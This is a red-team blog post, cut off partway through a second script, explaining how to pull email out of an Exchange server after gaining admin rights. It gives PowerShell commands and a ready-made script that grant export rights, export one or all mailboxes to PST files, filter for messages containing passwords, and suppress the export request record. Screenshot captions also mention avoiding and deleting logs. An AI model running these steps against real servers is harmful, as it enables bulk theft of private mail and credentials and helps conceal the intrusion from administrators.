<!DOCTYPE HTML>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Exchange Export email methods, Yangsir">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Exchange Export email methods | Yangsir</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Yangsir" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Yangsir</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>Contact</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Yangsir</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			Contact
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/YangSirrr" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>github
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/YangSirrr" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="github" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Exchange Export email methods</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Redteam/">
                                <span class="chip bg-color">Redteam</span>
                            </a>
                        
                            <a href="/tags/Exchange/">
                                <span class="chip bg-color">Exchange</span>
                            </a>
                        
                            <a href="/tags/Information-collection/">
                                <span class="chip bg-color">Information collection</span>
                            </a>
                        
                            <a href="/tags/Export-Email/">
                                <span class="chip bg-color">Export Email</span>
                            </a>
                        
                            <a href="/tags/Search-Email/">
                                <span class="chip bg-color">Search Email</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Tips/" class="post-category">
                                Tips
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2021-07-30
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
                    2021-08-01
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    1.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    6 Min
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Assuming that you have obtained the administrative rights of the Exchange server, what you need to do now is to search and export the emails in the server, so as to obtain more critical and sensitive information, such as looking for passwords and personal information<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Basic-information-Acquisition"><a href="#Basic-information-Acquisition" class="headerlink" title="Basic information Acquisition"></a>Basic information Acquisition</h2><pre class="line-numbers language-none"><code class="language-none">Get your tar account

Get-MailboxStatistics -Identity yangsir |fl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png"></p>
<h2 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h2><h3 id="PSSession"><a href="#PSSession" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;rootkit.org\administrator&quot;
$Pass &#x3D; ConvertTo-SecureString -AsPlainText admin!@#45 -Force
$Credential &#x3D; New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
$Session &#x3D; New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http:&#x2F;&#x2F;OWA2013&#x2F;PowerShell&#x2F; -Authentication Kerberos -Credential $Credential
Import-PSSession $Session -AllowClobber<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.35.png"></p>
<pre class="line-numbers language-none"><code class="language-none">session address must be fqdn, if not fqdn will wrong like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.39.png"></p>
<pre class="line-numbers language-none"><code class="language-none">get pssession info：
Get-PSSession

stop PSSession：
Remove-PSSession $Session

get account：
Get-Mailbox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.46.png"></p>
<h3 id="Use-exchange"><a href="#Use-exchange" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">add the manager unit
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="MSDN-info"><a href="#MSDN-info" class="headerlink" title="MSDN info"></a>MSDN info</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;powershell&#x2F;module&#x2F;exchange&#x2F;?view&#x3D;exchange-ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Get-all-account"><a href="#Get-all-account" class="headerlink" title="Get all account"></a>Get all account</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.50.png"></p>
<h4 id="Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox"><a href="#Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox" class="headerlink" title="Get all mailbox information, including the number of messages, the last time to access the mailbox"></a>Get all mailbox information, including the number of messages, the last time to access the mailbox</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.58.png"></p>
<h4 id="Get-all-ou"><a href="#Get-all-ou" class="headerlink" title="Get all ou"></a>Get all ou</h4><pre class="line-numbers language-none"><code class="language-none">Get-OrganizationalUnit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.07.png"></p>
<h4 id="Get-the-follow-log"><a href="#Get-the-follow-log" class="headerlink" title="Get the follow log"></a>Get the follow log</h4><pre class="line-numbers language-none"><code class="language-none">system dir 
%ExchangeInstallPath%TransportRoles\Logs\MessageTracking<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.13.png"></p>
<h4 id="Gets-the-sender-information-of-the-specified-sender"><a href="#Gets-the-sender-information-of-the-specified-sender" class="headerlink" title="Gets the sender information of the specified sender"></a>Gets the sender information of the specified sender</h4><pre class="line-numbers language-none"><code class="language-none">See yangsir@rootkit.org for information about all emails sent from 18:00, 28 July 2021 to present

Get-MessageTrackingLog -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.18.png"></p>
<pre class="line-numbers language-none"><code class="language-none">same way to the example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.21.png"></p>
<pre class="line-numbers language-none"><code class="language-none">Get more easy info

Get-MessageTrackingLog -EventID send -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.25.png"></p>
<h2 id="Export"><a href="#Export" class="headerlink" title="Export"></a>Export</h2><h3 id="PSSession-1"><a href="#PSSession-1" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">Need connection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.30.png"></p>
<pre class="line-numbers language-none"><code class="language-none">Adds the current user to the Mailbox Import Expor role group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.33.png"></p>
<h4 id="Export-special-user"><a href="#Export-special-user" class="headerlink" title="Export  special user"></a>Export  special user</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;
New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)

this way to export the daochu dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.39.png"></p>
<h4 id="Export-the-key-from-email"><a href="#Export-the-key-from-email" class="headerlink" title="Export the key from email"></a>Export the key from email</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;
New-MailboxexportRequest -mailbox $User -ContentFilter &#123;(body -like &quot;*pass*&quot;)&#125; -FilePath (&quot;\\localhost\c$\daochu1\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.00.png"></p>
<h4 id="Export-all-email"><a href="#Export-all-email" class="headerlink" title="Export all email"></a>Export all email</h4><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%&#123;New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\localhost\c$\all\&quot;+($_.name)+&quot;.pst&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Export-log"><a href="#Export-log" class="headerlink" title="Export log"></a>Export log</h4><pre class="line-numbers language-none"><code class="language-none">get log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.04.png"></p>
<pre class="line-numbers language-none"><code class="language-none">you can use this way to not make log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.08.png"></p>
<pre class="line-numbers language-none"><code class="language-none">del all log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.12.png"></p>
<h4 id="PS-AUTO"><a href="#PS-AUTO" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">follow <span class="token keyword">from</span> 3gstudent 

<span class="token keyword">function</span> UsePSSessionToExportMailfromExchange
<span class="token punctuation">&#123;</span>
<span class="token comment">#Requires -Version 2.0</span>
<span class="token comment">&lt;#
.SYNOPSIS
This script will export the mail(.pst) from the Exchange server.
First it will use PSSession to connect the Exchange server.
Then it'll check the user's privilege.
If the user is not in the "Mailbox Import Export",the script will add the user to it and reconnect the Exchange server.
Next it will export the mail and save it.
At last it will remove the user from the group and remove the PSSession.
Author: 3gstudent
.PARAMETER User
The user to use.
In general, you can choose the account in the domain admins.
.PARAMETER Password
The password of the user.
.PARAMETER MailBox
The mail you want to export.
.PARAMETER ExportPath
The export path of the mail.
.PARAMETER ConnectionUri
The uri of the Exchange server.
Eg.
    http://Exchange01.test.com/PowerShell/
    
.PARAMETER $Filter
The search filter of the mail.
.EXAMPLE
PS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;"
#></span>
 	<span class="token keyword">param</span> <span class="token punctuation">(</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$User</span><span class="token punctuation">,</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">,</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$ConnectionUri</span><span class="token punctuation">,</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$Filter</span>
	<span class="token punctuation">)</span>
    <span class="token variable">$Flag</span> = 0
    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Import-PSSession"</span> 
    <span class="token comment">#Import-PSSession</span>
    <span class="token variable">$Pass</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token operator">-</span>AsPlainText <span class="token variable">$Password</span> <span class="token operator">-</span>Force
    <span class="token variable">$Credential</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token operator">-</span>ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span><span class="token variable">$Pass</span>
    <span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>
    <span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>

    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to check user"</span>
    <span class="token comment">#check user</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token operator">-</span>ErrorAction SilentlyContinue<span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>
    	<span class="token function">Write-Host</span> <span class="token string">"[!] The specified user already exists.No need to add it to the group"</span>
	<span class="token variable">$Flag</span> = 1
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
    	<span class="token function">Write-Host</span> <span class="token string">"[+] Start to add user"</span> 
    	<span class="token comment">#Add user</span>
    	<span class="token function">New-ManagementRoleAssignment</span> –Role <span class="token string">"Mailbox Import Export"</span> –User <span class="token variable">$User</span><span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    	<span class="token function">Write-Host</span> <span class="token string">"[>] Start to reconnect"</span>
    	<span class="token comment">#Reconnect</span>
    	<span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>
    	<span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>
    	<span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span> 
    <span class="token comment">#Export mail and do not save the export request</span>
    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token variable">$Filter</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Flag</span> = 0<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    	<span class="token function">Write-Host</span> <span class="token string">"[>] Start to remove user"</span>
    	<span class="token comment">#Remove user</span>
    	<span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token punctuation">|</span><span class="token function">Remove-ManagementRoleAssignment</span> <span class="token operator">-</span>Confirm:<span class="token boolean">$false</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Remove-PSSession"</span>
    <span class="token comment">#Remove PSSession</span>
    <span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>
    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Use-exchange-1"><a href="#Use-exchange-1" class="headerlink" title="Use exchange"></a>Use exchange</h3><h4 id="Export-special-user-1"><a href="#Export-special-user-1" class="headerlink" title="Export special user"></a>Export special user</h4><pre class="line-numbers language-none"><code class="language-none">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
$User &#x3D; &quot;yangsir&quot;
New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.18.png"></p>
<h4 id="PS-AUTO-1"><a href="#PS-AUTO-1" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">same way <span class="token keyword">from</span> the 3gstudent

<span class="token keyword">function</span> DirectExportMailfromExchange
<span class="token punctuation">&#123;</span>
<span class="token comment">#Requires -Version 2.0</span>
<span class="token comment">&lt;#
.SYNOPSIS
This script will export the mail(.pst) from the Exchange server.
The script needs to be executed on the Exchange server.

Author: 3gstudent

.PARAMETER MailBox
The mail you want to export.

.PARAMETER ExportPath
The export path of the mail.
 
.PARAMETER $Filter
The search filter of the mail.

.PARAMETER $Version
The version of the Exhange.
It can be 2007,2010,2013 and 2016.

.EXAMPLE
PS C:\> DirectExportMailfromExchange -MailBox "test1" -ExportPath "\\localhost\c$\test\" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;" -Version 2013
#></span>
 	<span class="token keyword">param</span> <span class="token punctuation">(</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>
